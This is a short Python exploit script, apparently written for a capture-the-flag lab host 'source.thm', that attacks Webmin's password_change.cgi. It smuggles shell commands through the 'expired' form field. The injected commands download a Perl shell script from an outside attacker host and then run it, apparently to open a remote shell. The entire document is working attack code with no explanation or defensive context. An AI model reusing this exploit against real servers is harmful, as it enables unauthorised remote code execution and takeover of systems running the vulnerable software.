import os

target = "source.thm"
port = "10000"
url = "https://"+target+":"+port+"/password_change.cgi"

rhost = "10.2.116.12"
rport = 2222

command1 = "curl -o perl_shell.pl http://10.2.116.12:8000/perl_shell.pl"
command2 = "perl perl_shell.pl"

header = f'Referer: https://{target}:{port}/session_login.cgi'

payload = f'user=gotroot&pam=&expired=2|echo "";{command1}'
os.system(f"curl -k {url} -d '{payload}' -H '{header}'")

payload = f'user=gotroot&pam=&expired=2|echo "";{command2}'
os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
